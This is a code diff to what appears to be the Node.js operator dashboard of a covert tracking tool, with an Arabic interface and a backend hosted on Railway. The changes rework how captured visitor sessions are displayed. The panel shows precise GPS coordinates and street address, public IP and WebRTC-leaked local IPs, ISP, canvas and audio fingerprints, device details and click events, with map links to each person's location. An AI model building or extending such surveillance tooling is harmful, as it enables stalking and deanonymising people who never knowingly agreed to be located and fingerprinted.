@@ -4,7 +4,7 @@ const fs     = require("fs");
 const path   = require("path");
 const { exec } = require("child_process");
 
-const RAILWAY = "https://lm-production-b297.up.railway.app";
+const RAILWAY = "https://yom7-production.up.railway.app";
 const PORT    = 4000;
 
 /* ── fix iPhone model using screen size ── */
@@ -233,17 +233,17 @@ function renderList(){
     const clicks=(s.events||[]).filter(e=>e.type==="click").length;
     const dev=s.device||{},geo=s.geoIP||{},gps=s.gps||{};
     const active=s.sessionId===activeId?" active":"";
-    const locLink=gps.granted&&gps.mapsLink
-      ? '<a href="'+gps.mapsLink+'" target="_blank" style="font-size:11px;color:#2ecc71;display:block;margin-bottom:4px">📍 GPS دقيق</a>'
-      : geo.loc
-        ? '<a href="https://maps.google.com/?q='+geo.loc+'" target="_blank" style="font-size:11px;color:#f39c12;display:block;margin-bottom:4px">🗺 موقع تقريبي (IP)</a>'
-        : '';
+    const locLine = gps.granted && gps.mapsLink
+      ? '<a href="'+gps.mapsLink+'" target="_blank" style="font-size:11px;color:#2ecc71;display:block;margin-bottom:3px">📍 GPS: '+
+        (gps.address ? (gps.address.city||gps.address.suburb||'موقع دقيق') : 'موقع دقيق')+
+        (gps.accuracy ? ' (±'+gps.accuracy+')' : '')+'</a>'
+      : '<span style="font-size:11px;color:#888;display:block;margin-bottom:3px">GPS: لم يُمنح الإذن</span>';
     return \`<div class="sess-card\${active}" onclick="sel('\${s.sessionId}')">
       <div class="sid">\${s.sessionId}</div>
       <div class="stime">🕐 \${new Date(s.startedAt).toLocaleString()}</div>
-      <div class="sloc">📍 \${geo.city||"??"}, \${geo.country||"??"} — \${geo.ip||s.serverIp||"no IP"}</div>
       <div class="sdev">📱 \${dev.name||"Unknown"}</div>
-      \${locLink}
+      \${locLine}
+      <div style="font-size:10px;color:#555;margin-bottom:4px">🌐 IP: \${geo.ip||s.serverIp||"?"} — \${geo.city||"??"}, \${geo.country||"??"} <span style="color:#666;font-size:9px">(تقريبي)</span></div>
       <div class="pills">
         <span class="pill p-dev">\${dev.deviceType||"?"} · \${dev.browser||"?"}</span>
         <span class="pill p-os">\${dev.os||"?"}</span>
@@ -303,34 +303,36 @@ function renderDetail(){
     \${ic("Downlink",net.downlink)}
     \${ic("RTT",net.rtt)}
   </div></div>
-  <div class="sec"><div class="sec-title">IP & Location</div><div class="grid">
+  <div class="sec"><div class="sec-title" style="color:#2ecc71">📍 GPS — الموقع الدقيق</div>
+    \${gps.granted
+      ?'<div class="grid">'+
+        '<div class="ic" style="grid-column:1/-1;background:#0d2b1a;border:1px solid #2ecc71"><div class="lbl">العنوان الكامل</div><div class="val vg" style="font-size:14px">'+
+          (gps.address ? [gps.address.road,gps.address.suburb,gps.address.city,gps.address.state,gps.address.country].filter(Boolean).join('، ') : gps.lat+', '+gps.lon)+
+        '</div></div>'+
+        ic("خط العرض (Lat)",gps.lat,"vg")+ic("خط الطول (Lon)",gps.lon,"vg")+
+        ic("دقة الموقع",gps.accuracy)+ic("الارتفاع",gps.altitude)+
+        ic("السرعة",gps.speed)+ic("الاتجاه",gps.heading)+
+        ic("الرمز البريدي",gps.address&&gps.address.postcode||"N/A")+
+        '<div class="ic"><div class="lbl">فتح في الخريطة</div><a class="map" href="'+gps.mapsLink+'" target="_blank" style="color:#2ecc71;font-size:14px;font-weight:bold">📍 Google Maps (دقيق)</a></div>'+
+        '</div>'
+      :'<div style="background:#2a1a1a;border:1px solid #e74c3c;border-radius:6px;padding:12px;color:#e74c3c;font-size:13px">'
+        +(gps.granted===false?"❌ رفض المستخدم إذن الموقع":"⏳ لم يُمنح الإذن بعد")+'</div>'}
+  </div>
+  <div class="sec"><div class="sec-title">🌐 IP — الموقع التقريبي <span style="color:#e74c3c;font-size:10px;font-weight:normal">(غير دقيق — مبني على عنوان IP فقط)</span></div>
+  <div style="background:#2a1a00;border:1px solid #f39c12;border-radius:6px;padding:8px 12px;margin-bottom:10px;font-size:11px;color:#f39c12">
+    ⚠️ موقع الـ IP يعتمد على تسجيل شركة الإنترنت وقد يكون بعيداً جداً عن موقعك الفعلي
+  </div>
+  <div class="grid">
     \${ic("Public IP",geo.ip||s.serverIp||"N/A","vr")}
-    \${ic("Server IP",s.serverIp,"vr")}
     \${ic("Local IPs (WebRTC)",(dev.localIPs||[]).join(", ")||"N/A","vr")}
-    \${ic("City",geo.city)} \${ic("Region",geo.region)}
-    \${ic("Country",(geo.countryName||geo.country))}
-    \${ic("Postal",geo.postal)}
-    \${ic("ISP",geo.isp||geo.org)}
+    \${ic("المدينة (تقريبي)",geo.city)} \${ic("المنطقة",geo.region)}
+    \${ic("الدولة",(geo.countryName||geo.country))}
+    \${ic("الرمز البريدي",geo.postal)}
+    \${ic("ISP / شركة الإنترنت",geo.isp||geo.org)}
     \${ic("ASN",geo.asn)}
     \${ic("Timezone",geo.timezone)}
-    \${ic("Source",geo.source)}
-    \${geo.loc?'<div class="ic"><div class="lbl">خريطة IP</div><a class="map" href="https://maps.google.com/?q='+geo.loc+'" target="_blank">🗺 موقع تقريبي</a></div>':""}
+    \${geo.loc?'<div class="ic"><div class="lbl">خريطة IP</div><a class="map" href="https://maps.google.com/?q='+geo.loc+'" target="_blank" style="color:#f39c12">🗺 موقع تقريبي (غير دقيق)</a></div>':""}
   </div></div>
-  <div class="sec"><div class="sec-title">GPS (دقيق)</div>
-    \${gps.granted
-      ?'<div class="grid">'+ic("Lat",gps.lat,"vg")+ic("Lon",gps.lon,"vg")+ic("Accuracy",gps.accuracy)
-        +ic("Altitude",gps.altitude)+ic("Speed",gps.speed)+ic("Heading",gps.heading)
-        +'<div class="ic"><div class="lbl">Google Maps</div><a class="map" href="'+gps.mapsLink+'" target="_blank" style="color:#2ecc71">📍 فتح الموقع الدقيق</a></div>'
-        +(gps.address?'<div class="ic" style="grid-column:1/-1"><div class="lbl">العنوان</div><div class="val vg">'
-          +(gps.address.road?gps.address.road+', ':'')+
-          (gps.address.suburb?gps.address.suburb+', ':'')+
-          (gps.address.city||'')+
-          (gps.address.state?' — '+gps.address.state:'')+
-          (gps.address.country?' ('+gps.address.country+')':'')
-          +'</div></div>':"")
-        +'</div>'
-      :'<div class="nodata">GPS '+(gps.granted===false?"رفض المستخدم الإذن":"لم يُطلب بعد")+'.</div>'}
-  </div>
   <div class="sec"><div class="sec-title">Fingerprints</div><div class="grid">
     \${ic("Canvas FP",dev.canvasFingerprint,"vb")}
     \${ic("Audio FP",dev.audioFingerprint,"vb")}
